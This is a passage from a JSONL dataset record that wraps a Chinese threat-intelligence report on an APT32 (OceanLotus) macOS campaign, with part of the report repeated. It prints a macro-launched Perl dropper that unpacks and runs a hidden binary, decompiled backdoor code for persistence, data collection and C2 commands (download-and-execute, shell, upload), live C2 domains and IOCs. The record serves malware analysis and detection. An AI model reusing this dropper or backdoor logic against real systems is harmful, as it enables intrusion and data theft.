删除文件  \n\nif ( Command \\(= = 0\\times 48\\) ) { std::vector<unsigned char>::vector(v82, &v130); Converter::Converter(v83, v82); if ( v82[0] ) operator delete(v82[0]); v5 = v83; Converter::outString((Converter \\*)&v81); v47 = v81; if (\\*(_QWORD \\*)v81 - 3) { v5 = v83; Converter::outString((Converter \\*)&v80); v48 = v80; if (\\*(_QWORD \\*)v80 - 24) { std::string::string((std::string \\*)&v79, (const std::string \\*)&v81); v49 = removefile(&v79); v50 = v79 - 24; if ((_UNKNOWN \\*)v79 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed __int32 \\*)v79 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v50, v152); } if ( v49 ) v51 = 99;  \n\nCommand \\(= = 0\\times 72\\) 文件上传  \n\nif ( Command \\(= = 0\\times 72\\) ) { v29 = 1; v5 = (char \\*)&v153; pthread_create(&v84, &v153, respondUploadThread, v44); goto LABEL_163; }\n\n<--- Page Split --->\n\nCommand \\(= =\\) ox23 || Command \\(= =\\) ox3C文件下载  \n\nelse if ( Command \\(= =\\) ox23 || Command \\(= =\\) ox3C) { v29 = 1; v5 = (char \\\\*)&v153; pthread_create(&v84, &v153, (void \\\\*(_cdecl \\\\*)(void \\\\*))respondownloadThread, v44); goto LABEL_163; } if ( \\\\*v46 ) operator delete(\\*v46);  \n\n04  \n\n关联分析  \n\n根据样本行为特征、C2以及结合开源情报，确定此次攻击活动背后的组织为“海莲花”APT。  \n\n4.1  \n\n宏文档钓鱼  \n\n海莲花经常使用Word宏进行钓鱼攻击，文件普遍为.doc结尾的MHT恶意文档。本次攻击活动样本同样使用.doc结尾带有宏的MHT恶意文档。  \n\n4.2  \n\nC2特征  \n\n在海莲花历史样本（firefox.dmg)中，发现了与本次攻击相同的C2回连URL与本次攻击活动样本相符(/v3/yQ/r/eiCu1gd6Qme.js)。\n\n<--- Page Split --->\n\n## C2服务器  \n\n本次攻击活动样本的C2服务器：  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.csshttp:/  \n\n\\\\*左右滑动查看更多  \n\nIOC:  \n\nHASH:  \n\nSHA256:2BB855DC5D845EB5F2466D7186F150C172DA737BFD9C7F6BC1804E0B8D20F22A (2018- PHIEU GHI DANH THAM DU' TINH HOI HMDC 2018. doc)  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4 (syslogd)  \n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4docddc4f01fe32f369f6a845c8f (screenassistantd / spellagentd)  \n\nC2:  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.css  \n\nhttp://ssl.arkouthrie[.]com/v3/yQ/r/eiCu1gd6Qme.js  \n\n## 一往期回顾  \n\n![](images/22_0.jpg)\n\n\n<--- Page Split --->\n![](images/23_0.jpg)\n  \n\n关于安恒信息安全服务团队  \n\n安恒信息安全服务团队由九维安全能力专家构成，其职责分别为：红队持续突破、橙队擅于赋能、黄队致力建设、绿队跟踪改进、青队快速处置、蓝队实时防御，紫队不断优化、暗队专注情报和研究、白队运营管理，以体系化的安全人才及技术为客户赋能。\n\n<--- Page Split --->\n![](images/24_0.jpg)\n  \n\n收录于合集 #九维技术团队  \n\n140个下一篇九维团队- 青队（处置）|关于github上某免杀loader后门事件的分析\n\n<--- Page Split --->", "format_code": "38plain=(char*)get_plain((unsigned_int64*)v2,v3,KEY,KEYLENGTH,1);", "hash_code": "a947d7b0deeb59c1237988966c59b0d48ea0b86ebbb6e0d61d631b305b6321cd", "hash": "hash"}
{"file_name": "10cad491-31f3-4014-a017-27fa5b03b393_APT32.md", "title": "执行流程图", "malicious_code": "27 std::0x100307450LL:\"ssl.arkouthrie.com\"\n\n24 v5 = (unsigned _int8 *)strlen(v3);\n25 plain = (char *)get_plain((AES256 *)v3, v5, KEY, KEYLENGTH, 1);\n29 free(plain);\n\n11 system(\"\\\"$pathFolderFile/word/theme/syslogd\\\" &\");\n\n9 system(\"chmod +x \\\"\". $pathFolderFile . \"/word/theme/theme0.xml\\\"\");\n\n8 system(\"unzip \". $pathFile . \" -d \". $pathFolderFile);\n\n14 system(\"rm /tmp/modern\");\n\n13 system(\"rm -Rf /tmp/system\");\n\n10 move(\"$pathFolderFile/word/theme/theme0.xml\", \"$pathFolderFile/word/theme/syslogd\");\n\n7 copy($path, $pathFile);\n\n6 $path =~ tr://\\//;mkdir($pathFolderFile);\n\n5 $path = \"/Volumes/\". chr(0x52) . chr(0x3A);\n\n4 $pathFile = $pathFolderFile . \"/system\";\n\n3 $pathFolderFile = \"/tmp/system\";\n\n2 use File::Copy;\n\n1 #!/usr/bin/perl\n\nv7 = HandlePP::loadLuna((std::string *)&v30);\n\n*(unsigned int *)(a1 + 29) = HandlePP::runCommand(&v20, (unsigned int)v2, &v21);\n\nv49 = removefile(&v79);\n\npthread_create(&v84, &v153, respondLoadLunaThread, v44);\n\npthread_create(&v84, &v153, respondRunTerminalThread, v44);\n\npthread_create(&v84, &v153, respondUploadThread, v44);\n\npthread_create(&v84, &v153, (void *(*)(void *))respondownloadThread, v44);", "describe": "<--- Page Split --->\n![](images/2_0.jpg)\n  \n\n3- 3  \n\n分析过程  \n\n#### 3.3.1 第一阶段分析  \n\n样本启动后文档内容如下，诱导用户启用宏：\n\n<--- Page Split --->\n![](images/3_0.jpg)\n  \n\n恶意文档首先判断系统版本，如果32位系统会尝试加载\"libc.dylib\"中的导出函数system，用来执行系统命令。如果是64位系统则将文档正文设置为白色，并隐藏文字，伪装成空白文档迷惑受害者。  \n\n![](images/3_1.jpg)\n\n\n<--- Page Split --->\n\n判断系统类型，如果是MacOS系统则继续执行。  \n\nSub Jurvq86PFf2PkeTyWNjv() Dim strString1 As String strString1 = \"\\*Mac\\*\" If Application.system.OperatingSystem Like strString1 Then If Val(Application.Version) < 15 Then fsDcrRr0qMRSMIMmFuWL End If End If End Sub  \n\n将当前文档所在路径拼接进Perl脚本内：  \n\n最后输出的Perl脚本会从文档中解压出themeo.xml文件，添加可执行权限并执行。\n\n<--- Page Split --->\n\n1 #!/usr/bin/perl  2 use File::Copy;  3 $pathFolderFile = \"/tmp/system\";  4 $pathFile = $pathFolderFile . \"/system\";  5 $path = \"/Volumes/\". chr(0x52) . chr(0x3A);  6 $path =~ tr://\\//;mkdir($pathFolderFile);  7 copy($path, $pathFile);  8 system(\"unzip \". $pathFile . \"- d \". $pathFolderFile);  9 system(\"chmod +x \\\"\". $pathFolderFile . \"/word/theme/theme0.xml\\\"\");  10 move(\"$pathFolderFile/word/theme/theme0.xml\", \"$pathFolderFile/word/theme/syslogd\");  11 system(\"\\\"$pathFolderFile/word/theme/syslogd\\\" &\");  12 sleep(1);  13 system(\"rm -Rf /tmp/system\");  14 system(\"rm /tmp/modern\");  15  \n\n#### 3.3.2 第二阶段分析  \n\n文件名：syslogd  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4SHA1:CE3E827BCC426AEA70447C2D6FF52C2B239DB33EMD5:DA71B64E77AD45BAB56CF71ECD4F55D4  \n\n生成时间：2018- 02- 14 09:58:54 UTC  \n\n## 核心功能实现在setStartup方法内。  \n\n1 int __cdecl main(int argc, const char **argv, const char **envp) {  2 int v3; // eax  3 char buffer[2008]; // [rsp+0h] [rbp- 7F0h] BYREF  4  5 setStartup();  6 v3 = getpid();  7 proc_pidpath(v3, buffer, 0x7D0u);  8 remove(buffer);  9 return 0;  10 }\n\n<--- Page Split --->\n\nisRootUser = isRoot(); GET_PROCESSPATH((std::string \\*)&path, isRootUser);// 解密后门路径 std::string::string(&v64, path, v63); convertPathUser(&v64, __s); v1 = v64 - 24; if ((__UNKNOWN \\*) (v64 - 24) != &MEMORY[0x7FFF870371F0] && __InterlockedExchangeAdd((volatile signed __int32 \\*) (v64 - 8), 0xFFFFFFFF) <= 0) { std::string::_Rep::_M_destroy(v1, v98); } v2 = strlen(__s); std::string::assign((std::string \\*)&path, __s, v2); createFolder(path); GET_PROCESSNAME((std::string \\*)&v62, isRootUser);// 解密进程名 fileName = v62; filePath = appendPathComponent(path, v62); // 拼接路径和进程名 if ((unsigned __int8)Loader::installLoader(filePath, fileName)) { hiddenFile(filePath); // 隐藏文件 setTimeFile(filePath); // 随机修改创建时间 } if (filePath) { free(filePath); } if (isRootUser) { v94 = (char \\*)&MEMORY[0x7FFF870371F0] + 24; if ((unsigned __int8)isRoot()) { n1n - /h-n \\*1n+ n1n/n  \n\n首先会判断是否为Root用户，根据权限将后门文件写入不同的路径中。  \n\nGET_PROCESSPATH方法为解密字符串，样本内所有字符串均使用该方法加密。  \n\n1 std::string \\\\*_fastcall GET_PROCESSPATH(std::string \\\\*this, char a2) 2 unsigned _int8 \\\\*v3; // rdi bool v4; // zf unsigned _int64 v5; // rsi char \\\\*plain; // rbx unsigned _int64 v7; // rax 9 \\\\*(_QWORD \\\\*)this = (char \\\\*)&std::string::_Rep::_S_empty_rep_storage + 24; v3 = \"a0edx0qnx17FJEtC6FpDxQnJt5GHZIBJBsTgiwNisAs\"; v4 = a2 == 0; if (a2) v3 = \"4dH/0ppoS1Wb+VK6IZYxSyuOZm9aG4Jd6ymlask23NG17syz26NLwMznGyITuDw80V5X4Stx958H/Z/Xit5XLKnJ+Am6VhpAgll+JED85pgIn\" \"kks8dVkmDet/Ywx/M\"; v5 = 44LL; if (1v4) v5 = 128LL; plain = (char \\\\*)get_plain(v3, v5, KEY, KEYLENGTH, 1); v7 = strlen(plain); std::string::assign(this, plain, v7); if (plain) free(plain); return this;  \n\n加密方式为AES256，密钥长度20个字节。\n\n<--- Page Split --->\n![](images/7_0.jpg)\n  \n\n解密的硬编码路径为：  \n\n有root权限：  \n\n/Library/CoreMediaIO/Plug- Ins/FCP- DAL/i0SScreenCapture.plugin/Contents/Resources  \n\n左右滑动查看更多\n\n<--- Page Split --->\n![](images/8_0.jpg)\n  \n\n无root权限：  \n\n~/Library/Spelling/  \n\n![](images/8_1.jpg)\n  \n\n解密出进程名：  \n\nRoot用户：screennassistant非Root用户：spellagentd\n\n<--- Page Split --->\n![](images/9_0.jpg)\n  \n\n后门安装方法主要实现在Loader::installLoader内，从自身读取出第三阶段可执行文件，写入磁盘。  \n\n![](images/9_1.jpg)\n\n\n<--- Page Split --->\n\n通过文件头判断出后门为Mach- O可执行文件。  \n\n![](images/10_0.jpg)\n  \n\nsetTimeFile方法会调用系统命令修改文件创建时间，解密出的命令行为：  \n\ntouch - t 1407260241 \\\"/Users/hep/Library/Spelling/spellagentd\\\" > /dev/null  \n\n\\*左右滑动查看更多  \n\n如果当前是root用户，还会解密出路径/Library/LaunchDaemons/，并创建服务文件/Library/LaunchDaemons/com.apple.screen.assistantd.plist  \n\n\\*左右滑动查看更多\n\n<--- Page Split --->\n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f  \n\nSHA1:91c6ac1f84e2f8a4cf0f8e4d5c8590fc3c1ocf08  \n\nMD5:306d3ed0a7c899b5ef9d0e3c91f05193  \n\n核心功能点在HandlePP::infoClient与HandlePP::runHandle两个方法里，infoClient负责信息搜集，runHandle负责执行C2命令：  \n\n![](images/11_0.jpg)\n  \n\n## 信息搜集  \n\nHandlePP::infoClient方法搜集系统信息，如安装时间、系统版本、用户名、计算机名等，加密后回传C2。\n\n<--- Page Split --->\n\n{ clientID = (_OWORD \\*)HandlePP::getClientID(v5); \\*(_OWORD \\*)&HandlePP::clientID = \\*ClientID; if (ClientID) free(ClientID); HandlePP::installTime = time(0LL); v7 = malloc(0x7D0uLL); bzero(v7. 0x7D0uLL):  \n\n225 if (!(unsigned _int8)isRoot()) 226 v14 = 72; 227 HandlePP::getOSVersion((HandlePP \\*)&osVersion); 228 HandlePP::getUsername((HandlePP \\*)&userName); 229 HandlePP::getComputerName((HandlePP \\*)&computerName); 230 Arch = HandlePP::getArch((HandlePP \\*)&computerName); 231 v16 = getpid(); 232 std::string::string((std::string \\*)v68, (const std::string \\*)&HandlePP::pathProcess); 233 Parser::Parser((Parser \\*)v67); 234 Parser::inBytes((Parser \\*)v67, &HandlePP::clientID, 0x10u); 235 Parser::inByte((Parser \\*)v67, 0x31u); 236 Parser::inByte((Parser \\*)v67, 0x30u); 237 Parser::inByte((Parser \\*)v67, byte_10001541A); 238 Parser::inByte((Parser \\*)v67, v14); 239 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)osVersion, \\*((_DWORD \\*)osVersion - 6)); 240 Parser::inByte((Parser \\*)v67, 0x74u); 241 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)userName, \\*((_DWORD \\*)userName - 6)); 242 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)computerName, \\*((_DWORD \\*)computerName - 6)); 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10000808) 00000804_2N8HandlePP10infoClientEv:230 (100000084) 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10  \n\nSTRINGDATA::GET_PATH_INFO方法执行后会解密出一段路径。  \n\n非Root用户路径：  \n\n- /Library/PubSub/Feeds/db.sqlite3  \n\nz6 1 27 v3 = strlen(v2); 28 plain = (char \\*)get_plain((unsigned _int8 \\*)v2, v3, KEY, KEYLENGTH, 1); 29 v5 char \\*plain; // rbx 30 std 0x1003042B0LL:\"~/Library/PubSub/Feeds/db.sqlite3\" 31 if (plain) 32 free(plain); 33 return this; 34 }  \n\nRoot用户路径：  \n\n/Library/Modem Scripts/Motorola BitsURFR 56K.ccl/Contents/Resources/Motorola.rbon.framework/Versions/A/Framework\n\n<--- Page Split --->\n\n*左右滑动查看更多  \n\n![](images/13_0.jpg)\n  \n\n内容为用作识别客户端身份的唯一ID：  \n\n{hep@hepdeMac Feeds % xxd db.sqlite3 00000000: 8ba2 1b12 e0f8 45d8 ca80 a213 e770 7481 ....E......pt. 0000010: c7eb 623d 78ea 561a bea5 7df8 0b26 3d3f .b=x.V...}.&=? hep@hepdeMac Feeds %  \n\n调用hiddenFile / setTimeFile方法隐藏文件，随机化创建时间：  \n\n![](images/13_1.jpg)\n  \n\n加密搜集到的信息：\n\n<--- Page Split --->\n\n230 Arch = HandlePP::getArch((HandlePP *)&computerName); 231 pid = getpid(); 232 std::string::string(std::string *)&v68, (const std::string *)&HandlePP::pathProcess); 233 Parser::Parser((Parser *)v67); 234 Parser::inBytes((Parser *)v67, &HandlePP::clientID, &x1u); 235 Parser::inByte((Parser *)v67, &x31u); 236 Parser::inByte((Parser *)v67, &x3Du); 237 Parser::inByte((Parser *)v67, byte_10001541A); 238 Parser::inByte((Parser *)v67, v14); 239 Parser::inString((Parser *)v67, (unsigned _int8 *)osVersion, *((_DWORD *)osVersion - 6)); 240 Parser::inByte((Parser *)v67, &x74u); 241 Parser::inString((Parser *)v67, (unsigned _int8 *)userName, *((_DWORD *)userName - 6)); 242 Parser::inString((Parser *)v67, (unsigned _int8 *)computerName, *((_DWORD *)computerName - 6)); 243 Parser::inLong((Parser *)v67, HandlePP::installTime); 244 Parser::inByte((Parser *)v67, Arch); 245 Parser::inInt((Parser *)v67, pid); 246 Parser::inString((Parser *)v67, v68, *((_DWORD *)v68 - 6)); 247 Parser::getDataVector((Parser *)v66); 248 std::vector<unsigned char>::vector(v66, v66); 249 Packet::Packet(v61, v60, 7LL, 0LL, 0LL); 250 if (v60[0]) 251 operator delete(v60[0]); 252 v59 = 0; 253 Packet::getArrayBytes((Packet *)v58, (bool *)v61); 254 if (v59) 255 { 256 v23 = 0; 257 goto LABEL_98; 258 }  \n\n获取c2域名ssl.arkouthrie.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100404990LL:\"ssl.arkouthrie.com\" 42 free(plain);  \n\n备用C2域名s3.hiahornber.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100405AB0LL:\"s3.hiahornber.com\" 42 free(plain);  \n\n备用C2域名ssl.arkouthrie.com。  \n\n24 v5 = (unsigned _int8 *)strlen(v3); 25 plain = (char *)get_plain((AES256 *)v3, v5, KEY, KEYLENGTH, 1); 26 v7 = char *plain; // rbx 27 std::0x100307450LL:\"ssl.arkouthrie.com\" 28 if (plain) 29 free(plain); 30 return this;\n\n<--- Page Split --->\n\n拼接请求：  \n\nhttp://ssl.arkouthrie.com/v3/yQ/r/eiCu1gd6Qme.js  \n\n*左右滑动查看更多  \n\n![](images/15_0.jpg)\n  \n\n调用Connector::postHttp发送数据：  \n\n![](images/15_1.jpg)\n  \n\n## 远程控制  \n\nHandlePP::runHandle部分主要功能为请求C2、接收指令并执行：\n\n<--- Page Split --->\n![](images/16_0.jpg)\n  \n\n进入 HandlePP::requestServer 方法。  \n\n解密并拼接请求后，通过 Packet::getCommand 获取控制命令：  \n\n![](images/16_1.jpg)\n  \n\n受控命令功能分析：\n\n<--- Page Split --->\n\n\n<table><tr><td>0x33</td><td>获取文件大小</td></tr><tr><td>0xE8</td><td>退出进程</td></tr><tr><td>0xA2</td><td>远程下载文件并执行</td></tr><tr><td>0xA1</td><td>执行系统命令</td></tr><tr><td>0x48</td><td>删除文件</td></tr><tr><td>0x72</td><td>文件上传</td></tr><tr><td>0x23/0x3C</td><td>文件下载</td></tr></table>  \n\nCommand \\(= = 0x33\\) 获取文件大小  \n\nif（Command \\(= = 0x33\\) ）{ std::vector<unsigned char>::vector(v103,&v130); Converter::Converter(v104,v103); if（v103[0]） operator delete(v103[0]); \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v102); \\(\\mathrm{v31} = \\mathrm{v102}\\) if（\\\\*(_QWORD \\\\*)（v102- 24）） { \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v101); \\(\\mathrm{v32} = \\mathrm{v101}\\) if（\\\\*(_QWORD \\\\*)v101- 3）） { std::string::string((std::string \\\\*)&v100,（const std::string \\\\*)&v101); FileSize \\(=\\) getFileSize((const std::string \\\\*)&v100);//获取文件大小 \\(\\mathrm{v34} = \\mathrm{v100} - 24\\) if（_UNKNOWN \\\\*)（v100- 24） \\(! =\\) &std::string::_Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed int32 \\\\*)（v100- 8),0xFFFFFFFF) \\(< = 0\\) { std::string::_Rep::_M_destroy(v34,v152); } \\(\\mathrm{v35} = 122\\) if（FileSize \\(! = - 1\\) ） \\(\\mathrm{v35} = \\mathrm{0}\\) \\(\\mathrm{v36} = 21\\)\n\n<--- Page Split --->\n\nif（Command \\(= = 0\\times E8\\) ）{ std::vector<unsigned char>::vector(v109,&v130); Converter::Converter(v110,v109); if（v109[0]） operator delete(v109[0]); v5 \\(= v110\\) . Converter::outString((Converter \\\\*)&v108); if（\\\\*（_QWORD\\\\*)（v108- 24）） { std::string::string(std::string \\\\*)&v107,（const std::string \\\\*)&v108); std::vector<unsigned char>::vector(v106,v140); std::string::string(std::string \\\\*)&v105,（const std::string \\\\*)&v128); HandlePP::respondServer((std::string \\\\*)&v107,（_int64)v106,（const std::string \\\\*)&v105); v60 \\(= v105 - 24\\) if（_UNKNOWN\\\\*)（v105- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v105- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v60,v152); } if（v106[0]） operator delete(v106[0]); v61 \\(= v107 - 24\\) if（_UNKNOWN\\\\*)（v107- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v107- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v61,v152); } exit(0); }  \n\nCommand \\(= = 0\\times \\mathrm{A2}\\) &&Command \\(= = 0\\times \\mathrm{A1}\\)  \n\nif（Command \\(> 0\\times \\mathrm{A1}\\) ） { if（Command \\(= = 0\\times \\mathrm{A2}\\) ） { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondLoadLunaThread,v44);//远程下载文件并执行 } else { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondRunTerminalThread,v44);//执行系统命令 } goto LABEL_163; } if（Command \\(> 71\\) ）  \n\nrespondLoadLunaThread线程分析（功能：下载文件并执行）  \n\n如果已执行就删除执行文件。\n\n<--- Page Split --->\n\nv3 = a1 + 3; std::vector<std::string>::push_back(&v33, a1 + 33); if (v2 == 178 && *((_DWORD *)a1 + 6) == 162 ) { if ((unsigned _int8)is_file_exist(_filename) )//判断文件存在 { a1[28] = 36; } else if (!fopen(_filename, \"w\")) { fclose(0LL); } v4 = a1 + 28; if (!a1[28]) { std::string::string((std::string *)&v32, (const std::string *)&_filename); v5 = checkProcessExist(&v32); //判断进程存在 v6 = v32 - 24; if ((_UNKNOWN *)v32 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v32 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v6, v40); } if (v5) { v4 = 126; std::string::string((std::string *)&v31, (const std::string *)&_filename); removeFile(&v31); //删除文件 v7 = v31 - 24; if ((_UNKNOWN *)v31 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v31 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v7, v40); } } } else { v4 = a1 + 28; } } else { if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *)v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; }  \n\n未执行就写入磁盘并执行。  \n\nif (!v4) { std::string::string((std::string *)&v30, (const std::string *)&_filename); std::vector<unsigned char>::vector(&v29, v35); *(_DWORD *) (a1 + 29) = HandlePP::loadLuna((std::string *)&v30);//写入并执行文件 if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *) (v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; } }  \n\nrespondRunTerminalThread 线程分析（功能：执行系统命令）\n\n<--- Page Split --->\n\n8 std::vector<unsigned char>::vector(v24, a1); 9 Converter::Converter(v25, v24); 0 if (v24[0] ) 1 operator delete(v24[0]); 2 Converter::outString((Converter \\*)&v23); 3 Converter::outString((Converter \\*)&v22); 4 v2 = Converter::outShort((Converter \\*)v25); 5 v21 = (_int64)&std::string::_Rep::_S_empty_rep_storage + 24; 6 std::string::string((std::string \\*)&v20, (const std::string \\*)&v22); 7 \\*(_DWORD \\*)(a1 + 29) = HandlePP::runCommand(&v20, (unsigned int)v2, &v21); 8 v3 = v20 - 24; 9 if ((_UNKNOWN \\*)v20 - 24) != &std::string::_Rep::_S_empty_rep_storage 0 &&_InterlockedExchangeAdd((volatile signed __int32 \\*)v20 - 8), 0xFFFFFFFF) <= 0 ) 1 2 std::string::_Rep::_M_destroy(v3, v26); 3 4 if (\\*(_DWORD \\*)(a1 + 29) ) 5 a1[28] = 18; 6 7  \n\nCommand \\(= = 0\\times 48\\) 删除文件  \n\nif ( Command \\(= = 0\\times 48\\) ) { std::vector<unsigned char>::vector(v82, &v130); Converter::Converter(v83, v82); if ( v82[0] ) operator delete(v82[0]); v5 = v83; Converter::outString((Converter \\*)&v81); v47 = v81; if (\\*(_QWORD \\*)v81 - 3) { v5 = v83; Converter::outString((Converter \\*)&v80); v48 = v80; if (\\*(_QWORD \\*)v80 - 24) { std::string::string((std::string \\*)&v79, (const std::string \\*)&v81); v49 = removefile(&v79); v50 = v79 - 24; if ((_UNKNOWN \\*)v79 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed __int32 \\*)v79 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v50, v152); } if ( v49 ) v51 = 99;  \n\nCommand \\(= = 0\\times 72\\) 文件上传  \n\nif ( Command \\(= = 0\\times 72\\) ) { v29 = 1; v5 = (char \\*)&v153; pthread_create(&v84, &v153, respondUploadThread, v44); goto LABEL_163; }\n\n<--- Page Split --->\n\nCommand \\(= =\\) ox23 || Command \\(= =\\) ox3C文件下载  \n\nelse if ( Command \\(= =\\) ox23 || Command \\(= =\\) ox3C) { v29 = 1; v5 = (char \\\\*)&v153; pthread_create(&v84, &v153, (void \\\\*(_cdecl \\\\*)(void \\\\*))respondownloadThread, v44); goto LABEL_163; } if ( \\\\*v46 ) operator delete(\\*v46);  \n\n04  \n\n关联分析  \n\n根据样本行为特征、C2以及结合开源情报，确定此次攻击活动背后的组织为“海莲花”APT。  \n\n4.1  \n\n宏文档钓鱼  \n\n海莲花经常使用Word宏进行钓鱼攻击，文件普遍为.doc结尾的MHT恶意文档。本次攻击活动样本同样使用.doc结尾带有宏的MHT恶意文档。  \n\n4.2  \n\nC2特征  \n\n在海莲花历史样本（firefox.dmg)中，发现了与本次攻击相同的C2回连URL与本次攻击活动样本相符(/v3/yQ/r/eiCu1gd6Qme.js)。\n\n<--- Page Split --->\n\n## C2服务器  \n\n本次攻击活动样本的C2服务器：  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.csshttp:/  \n\n\\\\*左右滑动查看更多  \n\nIOC:  \n\nHASH:  \n\nSHA256:2BB855DC5D845EB5F2466D7186F150C172DA737BFD9C7F6BC1804E0B8D20F22A (2018- PHIEU GHI DANH THAM DU' TINH HOI HMDC 2018. doc)  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4 (syslogd)  \n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4docddc4f01fe32f369f6a845c8f (screenassistantd / spellagentd)  \n\nC2:  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.css  \n\nhttp://ssl.arkouthrie[.]com/v3/yQ/r/eiCu1gd6Qme.js  \n\n## 一往期回顾  \n\n![](images/22_0.jpg)\n\n\n<--- Page Split --->\n![](images/23_0.jpg)\n  \n\n关于安恒信息安全服务团队  \n\n安恒信息安全服务团队由九维安全能力专家构成，其职责分别为：红队持续突破、橙队擅于赋能、黄队致力建设、绿队跟踪改进、青队快速处置、蓝队实时防御，紫队不断优化、暗队专注情报和研究、白队运营管理，以体系化的安全人才及技术为客户赋能。\n\n<--- Page Split --->\n![](images/24_0.jpg)\n  \n\n收录于合集 #九维技术团队  \n\n140个下一篇九维团队- 青队（处置）|关于github上某免杀loader后门事件的分析\n\n<--- Page Split --->", "format_code": "27std::0x100307450LL:\"ssl.arkouthrie.com\"24v5=(unsigned_int8*)strlen(v3);25plain=(char*)get_plain((AES256*)v3,v5,KEY,KEYLENGTH,1);29free(plain);11system(\"\\\"$pathFolderFile/word/theme/syslogd\\\"&\");9system(\"chmod+x\\\"\".$pathFolderFile.\"/word/theme/theme0.xml\\\"\");8system(\"unzip\".$pathFile.\"-d\".$pathFolderFile);14system(\"rm/tmp/modern\");13system(\"rm-Rf/tmp/system\");10move(\"$pathFolderFile/word/theme/theme0.xml\",\"$pathFolderFile/word/theme/syslogd\");7copy($path,$pathFile);6$path=~tr://\\//;mkdir($pathFolderFile);5$path=\"/Volumes/\".chr(0x52).chr(0x3A);4$pathFile=$pathFolderFile.\"/system\";3$pathFolderFile=\"/tmp/system\";2useFile::Copy;1#!/usr/bin/perlv7=HandlePP::loadLuna((std::string*)&v30);*(unsignedint*)(a1+29)=HandlePP::runCommand(&v20,(unsignedint)v2,&v21);v49=removefile(&v79);pthread_create(&v84,&v153,respondLoadLunaThread,v44);pthread_create(&v84,&v153,respondRunTerminalThread,v44);pthread_create(&v84,&v153,respondUploadThread,v44);pthread_create(&v84,&v153,(void*(*)(void*))respondownloadThread,v44);", "hash_code": "1b75ee5853ebbfcac5f089abb59d8f8282aa88cee7251d3b7259de4d61273b8a", "hash": "hash"}
